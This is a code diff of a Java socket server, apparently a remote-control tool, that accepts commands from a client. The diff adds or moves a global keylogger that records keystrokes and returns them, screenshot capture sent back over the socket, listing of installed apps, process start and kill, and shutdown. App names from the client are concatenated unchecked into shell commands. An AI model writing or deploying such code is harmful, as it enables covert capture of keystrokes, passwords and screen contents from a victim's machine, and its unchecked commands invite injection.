@@ -2,12 +2,14 @@ import java.io.*;
 import java.lang.annotation.Native;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.util.List;
 import java.net.http.WebSocket;
 
 import java.awt.*;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.util.ArrayList;
 import javax.imageio.ImageIO;
 
 import com.github.kwhat.jnativehook.GlobalScreen;
@@ -15,14 +17,14 @@ import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 
-public class Server implements NativeKeyListener{
-    static String keyLoggingResult = "";
+public class Server implements NativeKeyListener {
+    static private String keyLoggingResult = "";
 
     public void nativeKeyPressed(NativeKeyEvent e) {
-        keyLoggingResult += (NativeKeyEvent.getKeyText(e.getKeyCode()) + "-");
+        keyLoggingResult += (NativeKeyEvent.getKeyText(e.getKeyCode()) + " ");
     }
 
-    public static void main(String[] args)  {
+    public static void main(String[] args) {
         Server server = new Server();
 
         try {
@@ -50,7 +52,63 @@ public class Server implements NativeKeyListener{
             while (true) {
                 String request = reader.readLine();
 
-                if (request.equals("shutdown")) {
+                if (request.equals("get-apps")) {
+                    String appsList = getAppsList().toString();
+                    writer.println(appsList);
+                    writer.flush();
+
+                } else if (request.equals("get-services")) {
+
+                } else if (request.startsWith("start-app-")) {
+                    String appName = request.substring(10);
+                    boolean success = startApp(appName);
+                    writer.println(success);
+                    writer.flush();
+
+                } else if (request.startsWith("start-service-")) {
+
+                } else if (request.startsWith("stop-app-")) {
+                    String appName = request.substring(10);
+                    boolean success = stopApp(appName);
+                    writer.println(success);
+                    writer.flush();
+
+                } else if (request.startsWith("stop-service-")) {
+
+                } else if (request.equals("screenshot")) {
+                    try {
+                        byte[] screenshotBytes = captureScreenshot();
+                        writer.println(screenshotBytes.length);
+                        writer.flush();
+                        socket.getOutputStream().write(screenshotBytes);
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+
+                } else if (request.equals("start-keylogger")) {
+                    try {
+                        GlobalScreen.registerNativeHook();
+                        writer.println("Start Keylogger");
+                        writer.flush();
+                    }
+                    catch (NativeHookException ex) {
+                        System.err.println("There was a problem registering the native hook.");
+                        System.err.println(ex.getMessage());
+                        System.exit(1);
+                    }
+                    GlobalScreen.addNativeKeyListener(server);
+
+                } else if (request.equals("stop-keylogger")) {
+                    try {
+                        GlobalScreen.unregisterNativeHook();
+                    } catch (NativeHookException nativeHookException) {
+                        nativeHookException.printStackTrace();
+                    }
+                    GlobalScreen.removeNativeKeyListener(server);
+                    writer.println(keyLoggingResult);
+                    writer.flush();
+
+                } else if (request.equals("shutdown")) {
                     Runtime.getRuntime().exec("shutdown -s -t 900");
                     writer.println("The computer is shutting down.");
                     writer.flush();
@@ -60,7 +118,7 @@ public class Server implements NativeKeyListener{
                     writer.println("The computer is restarting.");
                     writer.flush();
 
-                } else if (request.equals("cancel")) {
+                } else if (request.equals("cancel-shutdown")) {
                     Runtime.getRuntime().exec("shutdown -a");
                     writer.println("All shutdown commands have been cancelled.");
                     writer.flush();
@@ -87,66 +145,6 @@ public class Server implements NativeKeyListener{
                         writer.println("The file doesn't exist.");
                         writer.flush();
                     }
-
-                }else if (request.equals("keylogging-start")) {
-                    try {
-                        GlobalScreen.registerNativeHook();
-                        System.out.println("Start keylogging");
-                    }
-                    catch (NativeHookException ex) {
-                        System.err.println("There was a problem registering the native hook.");
-                        System.err.println(ex.getMessage());
-                        System.exit(1);
-                    }
-                    GlobalScreen.addNativeKeyListener(server);
-
-                }else if (request.equals("keylogging-end")) {
-                    try {
-                        GlobalScreen.unregisterNativeHook();
-                    } catch (NativeHookException nativeHookException) {
-                        nativeHookException.printStackTrace();
-                    }
-                    GlobalScreen.removeNativeKeyListener(server);
-                    writer.println(keyLoggingResult);
-                    writer.flush();
-                    
-//                }else if (request.equals("list-apps")) {
-//                    List<String> appsList = getAppsList();
-//                    writer.println(appsList);
-//                    writer.flush();
-//
-//                }else if (request.startsWith("start-app-")) {
-//                    String appName = request.substring(10);
-//                    boolean success = startApp(appName);
-//                    writer.println(success);
-//                    writer.flush();
-//
-//                }else if (request.startsWith("stop-app-")) {
-//                    String appName = request.substring(10);
-//                    boolean success = stopApp(appName);
-//                    writer.println(success);
-//                    writer.flush();
-
-                } else if (request.equals("get-screenshot")) {
-                    try {
-                        Robot robot = new Robot();
-                        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-                        BufferedImage screenshot = robot.createScreenCapture(screenRect);
-
-                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                        ImageIO.write(screenshot, "png", baos);
-                        byte[] screenshotBytes = baos.toByteArray();
-                        baos.close();
-
-                        writer.println(screenshotBytes.length);
-                        writer.flush();
-                        socket.getOutputStream().write(screenshotBytes);
-
-                    } catch (AWTException | IOException e) {
-                        e.printStackTrace();
-                        writer.println("Error capturing screenshot.");
-                        writer.flush();
-                    }
                 }
             }
         } catch (Exception e) {
@@ -154,49 +152,47 @@ public class Server implements NativeKeyListener{
         }
     }
 
-    private List<String> getAppsList() {
+    private static List<String> getAppsList() {
         List<String> appsList = new ArrayList<>();
         try {
             Process process = Runtime.getRuntime().exec("wmic product list");
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-        
+
             String line;
             while ((line = reader.readLine()) != null) {
-              if (line.startsWith("Name:")) {
-                String appName = line.substring(6).trim();
-                appsList.add(appName);
-              }
+                if (line.startsWith("Name:")) {
+                    String appName = line.substring(6).trim();
+                    appsList.add(appName);
+                }
             }
-        
             reader.close();
-          } catch (IOException e) {
+        } catch (IOException e) {
             e.printStackTrace();
-          }
-        
-          return appsList;
         }
+        return appsList;
+    }
 
-    private boolean startApp(String appName) {
+    private static boolean startApp(String appName) {
         try {
             Runtime.getRuntime().exec("start " + appName);
             return true;
         } catch (IOException e) {
-        e.printStackTrace();
-        return false;
+            e.printStackTrace();
+            return false;
         }
     }
 
-    private boolean stopApp(String appName) {
+    private static boolean stopApp(String appName) {
         try {
             Runtime.getRuntime().exec("taskkill /F /IM " + appName + ".exe");
             return true;
         } catch (IOException e) {
-        e.printStackTrace();
-        return false;
+            e.printStackTrace();
+            return false;
         }
     }
 
-    private byte[] captureScreenshot() {
+    private static byte[] captureScreenshot() {
         try {
             Robot robot = new Robot();
             Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
@@ -209,9 +205,9 @@ public class Server implements NativeKeyListener{
 
             return baos.toByteArray();
         } catch (AWTException | IOException e) {
-        e.printStackTrace();
-        return null;
+            e.printStackTrace();
+            return null;
         }
-    }   
+    }
 }
 
